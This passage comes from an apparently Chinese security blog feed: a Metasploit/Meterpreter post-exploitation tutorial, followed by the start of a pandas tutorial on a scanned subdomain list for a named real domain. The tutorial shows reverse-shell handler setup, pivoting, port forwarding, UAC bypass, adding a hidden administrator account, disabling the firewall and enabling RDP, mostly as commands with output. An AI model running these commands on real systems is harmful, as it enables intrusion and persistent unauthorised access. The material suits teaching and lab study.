class="number">172.20</span>.<span class="number">10.13</span></span><br><span class="line">[*] Use the -p option <span class="keyword">to</span> list all active routes</span><br></pre></td></tr></table></figure><h5 id="打印当前添加的路由表信息"><a href="#打印当前添加的路由表信息" class="headerlink" title="打印当前添加的路由表信息"></a>打印当前添加的路由表信息</h5><figure class="highlight pascal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -p</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are <span class="keyword">deprecated</span>. <span class="keyword">Try</span> post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line"></span><br><span class="line">Active Routing Table</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   <span class="number">10.10</span>.<span class="number">10.0</span>         <span class="number">255.255</span>.<span class="number">255.0</span>      Session <span class="number">4</span></span><br></pre></td></tr></table></figure><p>删除指定的路由</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -d -s 10.10.10.0&#x2F;24</span><br></pre></td></tr></table></figure><h4 id="内网主机发现"><a href="#内网主机发现" class="headerlink" title="内网主机发现"></a>内网主机发现</h4><p>进去内网之后，我们使用相关模块进行主机发现。</p><h5 id="TCP扫描"><a href="#TCP扫描" class="headerlink" title="TCP扫描"></a>TCP扫描</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi&#x2F;handler) &gt; use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp</span><br><span class="line">msf5 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; show options</span><br><span class="line">msf5 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; set threads 10</span><br><span class="line">threads &#x3D;&gt; 10</span><br><span class="line">msf5 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; set RHOSTS 172.18.0.2-100</span><br><span class="line">RHOSTS &#x3D;&gt; 172.18.0.2-100</span><br><span class="line">msf5 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; set PORTS 3306,8022</span><br><span class="line">PORTS &#x3D;&gt; 3306,8022</span><br><span class="line">msf5 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; exploit</span><br><span class="line"></span><br><span class="line">[+] 172.18.0.3:           - 172.18.0.3:3306 - TCP OPEN</span><br><span class="line">[+] 172.18.0.2:           - 172.18.0.2:8022 - TCP OPEN</span><br><span class="line">[*] 172.18.0.2-100:       - Scanned 10 of 99 hosts (10% complete)</span><br></pre></td></tr></table></figure><h5 id="ARP扫描"><a href="#ARP扫描" class="headerlink" title="ARP扫描"></a>ARP扫描</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use post&#x2F;windows&#x2F;gather&#x2F;arp_scanner</span><br></pre></td></tr></table></figure><h4 id="Metasploit-Portfwd（端口转发-重定向）"><a href="#Metasploit-Portfwd（端口转发-重定向）" class="headerlink" title="Metasploit Portfwd（端口转发/重定向）"></a>Metasploit Portfwd（端口转发/重定向）</h4><p>在活动的Meterpreter会话中，键入<strong>portfwd -h</strong>将显示命令的各种选项和参数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd -h</span><br><span class="line">Usage: portfwd [-h] [add | delete | list | flush] [args]</span><br><span class="line">OPTIONS:</span><br><span class="line">     -L &gt;opt&gt;  要监听的本地主机（可选）。</span><br><span class="line">     -h        帮助横幅。</span><br><span class="line">     -l &gt;opt&gt;  要监听的本地端口。</span><br><span class="line">     -p &gt;opt&gt;  要连接的远程端口</span><br><span class="line">     -r &gt;opt&gt;  要连接的远程主机</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><p>Options：选项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-L：用于指定监听主机。 除非需要在特定网络适配器上进行转发，否则可以省略此选项。如果未输入任何值，则将使用0.0.0.0。</span><br><span class="line"></span><br><span class="line">-h：显示以上信息。</span><br><span class="line"></span><br><span class="line">-l：这是一个本地端口，它将在攻击机器上侦听。与此端口的连接将被转发到远程系统。</span><br><span class="line"></span><br><span class="line">-p：TCP连接将转发到的端口。</span><br><span class="line"></span><br><span class="line">-r：连接被中继到的IP地址（目标）。</span><br></pre></td></tr></table></figure><p> Arguments：参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Add：该参数用于创建转发。</span><br><span class="line"></span><br><span class="line">Delete：这将从我们的转发端口列表中删除先前的条目。</span><br><span class="line"></span><br><span class="line">List：这将列出当前转发的所有端口。</span><br><span class="line"></span><br><span class="line">Flush：这将删除我们的转发列表中的所有端口。</span><br></pre></td></tr></table></figure><p>例子：</p><p>Add参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd add –l 3389 –p 3389 –r  [target host]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add会将端口转发添加到列表中，并将为我们创建一个隧道。请注意，此通道也将存在于Metasploit控制台之外，使其可用于任何终端会话。</span><br><span class="line">-l 3389是本地端口，将被监听并转发到我们的目标。这可以是您的机器上的任何端口，只要它尚未被使用。</span><br><span class="line">-p 3389是我们的定向主机上的目标端口。</span><br><span class="line">-r [target host]是我们的目标系统的IP或主机名。</span><br></pre></td></tr></table></figure><p>List参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd list</span><br><span class="line">0: 0.0.0.0:3389 -&gt; 172.16.194.191:3389</span><br><span class="line">1: 0.0.0.0:1337 -&gt; 172.16.194.191:1337</span><br><span class="line">2: 0.0.0.0:2222 -&gt; 172.16.194.191:2222</span><br><span class="line">3 total local port forwards.</span><br></pre></td></tr></table></figure><h4 id="Windows权限提升"><a href="#Windows权限提升" class="headerlink" title="Windows权限提升"></a>Windows权限提升</h4><ul><li><p>绕过UAC</p><p>bypassuac</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac</span><br><span class="line">或者</span><br><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injection</span><br><span class="line">msf5 exploit(windows&#x2F;local&#x2F;bypassuac) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit&#x2F;windows&#x2F;local&#x2F;bypassuac):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   SESSION                     yes       The session to run this module on.</span><br><span class="line">   TECHNIQUE  EXE              yes       Technique to use if UAC is turned off (Accepted: PSH, EXE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows x86</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;local&#x2F;bypassuac) &gt;set target 1</span><br><span class="line">set target  1         #设置目标系统类型，1是64位，0是32位</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac  #该模块运行时会因为在目标机上创建多个文件而被杀毒软件识别，因此通过该模块提权成功率很低。</span><br><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injection  #该模块直接运行在内存的反射DLL中，所以不会接触目标机器的硬盘，从而降低了被杀毒软件检测出来的概率。</span><br></pre></td></tr></table></figure><p>RunAs绕过</p><p>创建一个可执行文件，目标机会运行一个发起提升权限请求的程序，提示用户是否要继续运行，如果用户选择“是”，就会触发返回一个高权限的meterpreter shell。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;ask</span><br><span class="line">msf5 exploit(windows&#x2F;local&#x2F;ask) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit&#x2F;windows&#x2F;local&#x2F;ask):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   FILENAME                    no        File name on disk</span><br><span class="line">   PATH                        no        Location on disk, %TEMP% used if not set</span><br><span class="line">   SESSION                     yes       The session to run this module on.</span><br><span class="line">   TECHNIQUE  EXE              yes       Technique to use (Accepted: PSH, EXE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;local&#x2F;ask) &gt;</span><br></pre></td></tr></table></figure></li></ul><h4 id="Windows渗透"><a href="#Windows渗透" class="headerlink" title="Windows渗透"></a>Windows渗透</h4><h5 id="cmd与3389"><a href="#cmd与3389" class="headerlink" title="cmd与3389"></a>cmd与3389</h5><ul><li>监听木马</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">msf5 post(multi&#x2F;manage&#x2F;autoroute) &gt; chcp 65001</span><br><span class="line">[-] Unknown command: chcp.</span><br><span class="line">msf5 post(multi&#x2F;manage&#x2F;autoroute) &gt; use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set LHOST 172.20.10.3</span><br><span class="line">LHOST &#x3D;&gt; 172.20.10.3</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set LPORT 1234</span><br><span class="line">LPORT &#x3D;&gt; 1234</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 172.20.10.3:1234</span><br><span class="line">[*] Sending stage (176195 bytes) to 172.20.10.6</span><br><span class="line">[*] Meterpreter session 1 opened (172.20.10.3:1234 -&gt; 172.20.10.6:6198) at 2020-09-05 12:31:20 +0800</span><br></pre></td></tr></table></figure><ul><li>获取当前权限以及提权</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: GOD\Administrator</span><br><span class="line">meterpreter &gt; getsystem</span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory&#x2F;Admin)).</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure><p>切换cmdshell，注意切换之后cmdshell与msf的会话具有相同的权限</p><ul><li>添加用户并加入管理员组</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;net user steady111 125219gxaGXA &#x2F;add</span><br><span class="line">net user steady111 125219gxaGXA &#x2F;add</span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;net localgroup administrators steady111 &#x2F;add</span><br><span class="line">net localgroup administrators steady111 &#x2F;add</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure><ul><li><p>开启关闭防火墙</p><p>windows2003之前</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">开启防火墙：</span><br><span class="line">netsh firewall set opmode mode&#x3D;enable</span><br><span class="line">关闭防火墙：</span><br><span class="line">netsh firewall set opmode mode&#x3D;disable</span><br></pre></td></tr></table></figure><p>windows2003之后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure></li></ul><ul><li>开启3389</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br><span class="line"> </span><br><span class="line">REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal&quot; 2&gt;&amp;1</span><br><span class="line"></span><br><span class="line">Server\WinStations\RDP-Tcp&quot; &#x2F;v PortNumber &#x2F;t REG_DWORD &#x2F;d 0x00000d3d &#x2F;f</span><br><span class="line">&quot; 2&gt;&amp;1</span><br></pre></td></tr></table></figure><ul><li>检查3389是否开放</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections</span><br><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server</span><br><span class="line"></span><br><span class="line">1表示关闭0表示开放</span><br><span class="line"></span><br><span class="line">fDenyTSConnections    REG_DWORD    0x1</span><br></pre></td></tr></table></figure><ul><li>查看远程桌面服务所在的端口</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;v PortNumber</span><br><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp</span><br></pre></td></tr></table></figure><h5 id="MSF与3389"><a href="#MSF与3389" class="headerlink" title="MSF与3389"></a>MSF与3389</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp  #开启远程桌面</span><br><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp USERNAME&#x3D;www2 PASSWORD&#x3D;123456 #添加用户</span><br><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp FORWARD&#x3D;true LPORT&#x3D;6662  #将3389端口转发到6662</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">portfwd add -l 6666 -p 3389 -r 127.0.0.1 #将目标机的3389端口转发到本地6666端口</span><br><span class="line">run getgui -f 6661 –e</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Metasploit–Meterpreter使用&quot;&gt;&lt;a href=&quot;#Metasploit–Meterpreter使用&quot; class=&quot;headerlink&quot; title=&quot;Metasploit–Meterpreter使用&quot;&gt;&lt;/a&gt;Metasploit–Met</summary>
      
    
    
    
    <category term="内网安全" scheme="http://s1eady.top/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="内网" scheme="http://s1eady.top/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>Python学习--渗透测试小脚本</title>
    <link href="http://s1eady.top/2020/11/11/Python%E5%AD%A6%E4%B9%A0--%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B0%8F%E8%84%9A%E6%9C%AC/"/>
    <id>http://s1eady.top/2020/11/11/Python%E5%AD%A6%E4%B9%A0--%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B0%8F%E8%84%9A%E6%9C%AC/</id>
    <published>2020-11-11T12:10:12.000Z</published>
    <updated>2020-11-10T02:34:24.714Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Python处理excel文档"><a href="#Python处理excel文档" class="headerlink" title="Python处理excel文档"></a>Python处理excel文档</h4><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200706131219279.png" alt="image-20200706131219279"></p><h5 id="pd-read-excel"><a href="#pd-read-excel" class="headerlink" title="pd.read_excel"></a>pd.read_excel</h5><h6 id="读取文件内容"><a href="#读取文件内容" class="headerlink" title="读取文件内容"></a>读取文件内容</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import pandas as pd</span><br><span class="line"></span><br><span class="line">content_list &#x3D; pd.read_excel(&quot;.&#x2F;52mf.com.xlsx&quot;)</span><br><span class="line">print(content_list)</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;bin&#x2F;python3.7 &#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;code&#x2F;python&#x2F;数据处理&#x2F;获取子域名的url</span><br><span class="line">     id                                url  ... elapsed  count</span><br><span class="line">0     9                 http:&#x2F;&#x2F;52mf.com:80  ...     0.2      1</span><br><span class="line">1    43            http:&#x2F;&#x2F;mail.52mf.com:80  ...     2.5      2</span><br><span class="line">2    51          https:&#x2F;&#x2F;mail.52mf.com:443  ...     2.5      2</span><br><span class="line">3    60      http:&#x2F;&#x2F;renter-api.52mf.com:80  ...     2.6      3</span><br><span class="line">4    68    https:&#x2F;&#x2F;renter-api.52mf.com:443  ...     2.6      3</span><br><span class="line">5    77             http:&#x2F;&#x2F;www.52mf.com:80  ...     2.6      3</span><br><span class="line">6    85           https:&#x2F;&#x2F;www.52mf.com:443  ...     2.6      3</span><br><span class="line">7    94               http:&#x2F;&#x2F;m.52mf.com:80  ...     9.4      4</span><br><span class="line">8   102             https:&#x2F;&#x2F;m.52mf.com:443  ...     9.4      4</span><br><span class="line">9   111              http:&#x2F;&#x2F;oa.52mf.com:80  ...     9.4      4</span><br><span class="line">10  145             http:&#x2F;&#x2F;vpn.52mf.com:80  ...    None      1</span><br><span class="line">11  153           https:&#x2F;&#x2F;vpn.52mf.com:443  ...    None      1</span><br><span class="line">12  162            http:&#x2F;&#x2F;smtp.52mf.com:80  ...    None      2</span><br><span class="line">13  170          https:&#x2F;&#x2F;smtp.52mf.com:443  ...    None      2</span><br><span class="line">14  179        http:&#x2F;&#x2F;provider.52mf.com:80  ...    None      4</span><br><span class="line">15  196             http:&#x2F;&#x2F;pop.52mf.com:80  ...    None      5</span><br><span class="line">16  204           https:&#x2F;&#x2F;pop.52mf.com:443  ...    None      5</span><br><span class="line">17  230            http:&#x2F;&#x2F;imap.52mf.com:80  ...    None      7</span><br><span class="line">18  238          https:&#x2F;&#x2F;imap.52mf.com:443  ...    None      7</span><br><span class="line">19  281               http:&#x2F;&#x2F;s.52mf.com:80  ...    None     13</span><br><span class="line">20  289             https:&#x2F;&#x2F;s.52mf.com:443  ...    None     13</span><br><span class="line">21  315    http:&#x2F;&#x2F;autodiscover.52mf.com:80  ...    None     16</span><br><span class="line">22  323  https:&#x2F;&#x2F;autodiscover.52mf.com:443  ...    None     16</span><br></pre></td></tr></table></figure><h6 id="name-指定列名"><a href="#name-指定列名" class="headerlink" title="name:指定列名"></a>name:指定列名</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">值为list或者str，默认None，一般使用list传参&lt;br&gt;</span><br><span class="line">指定表头的名称，list内的值跟表的列数要一一对应，即不能多也不能少，多或者少都会抛出ValueError错误: Number of passed names did not match number of header fields in the file</span><br><span class="line">使用str类型传参时会循环出每一个字符在赋值给每一个表头，即不能多也不能少，多或者少都会抛出ValueError错误。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import pandas as pd</span><br><span class="line"></span><br><span class="line">content_list &#x3D; pd.read_excel(&quot;.&#x2F;52mf.com.xlsx&quot;,names&#x3D;&quot;abcdefghijklmn&quot;)</span><br><span class="line">print(content_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;bin&#x2F;python3.7 &#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;code&#x2F;python&#x2F;数据处理&#x2F;获取子域名的url</span><br><span class="line">      a                                  b  ...     m   n</span><br><span class="line">0     9                 http:&#x2F;&#x2F;52mf.com:80  ...   0.2   1</span><br><span class="line">1    43            http:&#x2F;&#x2F;mail.52mf.com:80  ...   2.5   2</span><br><span class="line">2    51          https:&#x2F;&#x2F;mail.52mf.com:443  ...   2.5   2</span><br><span class="line">3    60      http:&#x2F;&#x2F;renter-api.52mf.com:80  ...   2.6   3</span><br><span class="line">4    68    https:&#x2F;&#x2F;renter-api.52mf.com:443  ...   2.6   3</span><br><span class="line">5    77             http:&#x2F;&#x2F;www.52mf.com:80  ...   2.6   3</span><br><span class="line">6    85           https:&#x2F;&#x2F;www.52mf.com:443  ...   2.6   3</span><br><span class="line">7    94               http:&#x2F;&#x2F;m.52mf.com:80  ...   9.4   4</span><br><span class="line">8   102             https:&#x2F;&#x2F;m.52mf.com:443  ...   9.4   4</span><br><span class="line">9   111              http:&#x2F;&#x2F;oa.52mf.com:80  ...   9.4   4</span><br><span class="line">10  145             http:&#x2F;&#x2F;vpn.52mf.com:80  ...  None   1</span><br><span class="line">11  153           https:&#x2F;&#x2F;vpn.52mf.com:443  ...  None   1</span><br><span class="line">12  162            http:&#x2F;&#x2F;smtp.52mf.com:80  ...  None   2</span><br><span class="line">13  170          https:&#x2F;&#x2F;smtp.52mf.com:443  ...  None   2</span><br><span class="line">14  179        http:&#x2F;&#x2F;provider.52mf.com:80  ...  None   4</span><br><span class="line">15  196             http:&#x2F;&#x2F;pop.52mf.com:80  ...  None   5</span><br><span class="line">16  204           https:&#x2F;&#x2F;pop.52mf.com:443  ...  None   5</span><br><span class="line">17  230            http:&#x2F;&#x2F;imap.52mf.com:80  ...  None   7</span><br><span class="line">18  238          https:&#x2F;&#x2F;imap.52mf.com:443  ...  None   7</span><br><span class="line">19  281               http:&#x2F;&#x2F;s.52mf.com:80  ...  None  13</span><br><span class="line">20  289             https:&#x2F;&#x2F;s.52mf.com:443  ...  None  13</span><br><span class="line">21  315    http:&#x2F;&#x2F;autodiscover.52mf.com:80  ...  None  16</span><br><span class="line">22  323  https:&#x2F;&#x2F;autodiscover.52mf.com:443  ...  None  16</span><br></pre></td></tr></table></figure><h6 id="usecols"><a href="#usecols" class="headerlink" title="usecols"></a>usecols</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">值为None、int、str、list类型，指定读取表格的指定列</span><br><span class="line"> </span><br><span class="line">None时，读取整个excel列</span><br><span class="line">int时，读取从第一列开始到该数值（包含）结束的中间所有列</span><br><span class="line">str时，只能按照excel的格式指定列，如&quot;A: G&quot;，读取A列到G列的所有列</span><br><span class="line">list时，list的元素只能是int型，如：[1, 4],表示读取list内指定的第一和第四列</span><br></pre></td></tr></table></figure><h5 id="案例–渗透中扫描到子域名存入xlsx文件并提取子域名"><a href="#案例–渗透中扫描到子域名存入xlsx文件并提取子域名" class="headerlink" title="案例–渗透中扫描到子域名存入xlsx文件并提取子域名"></a>案例–渗透中扫描到子域名存入xlsx文件并提取子域名</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">content_list = pd.read_excel(<span class="string">&quot;./52mf.com.xlsx&quot;</span>,usecols=[<span class="number">2</span>,<span class="number">5</span>],names=<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">contents_list = content_list.values.tolist()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;./mofang_url.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    <span class="keyword">for</span> list <span class="keyword">in</span> contents_list:</span><br><span class="line">        print(list[<span class="number">0</span>])</span><br><span class="line">        fp.write(list[<span class="number">0</span>]+<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="Python处理cvs文档"><a href="#Python处理cvs文档" class="headerlink" title="Python处理cvs文档"></a>Python处理cvs文档</h4><h5 id="CSV文件的写入"><a href="#CSV文件的写入" class="headerlink" 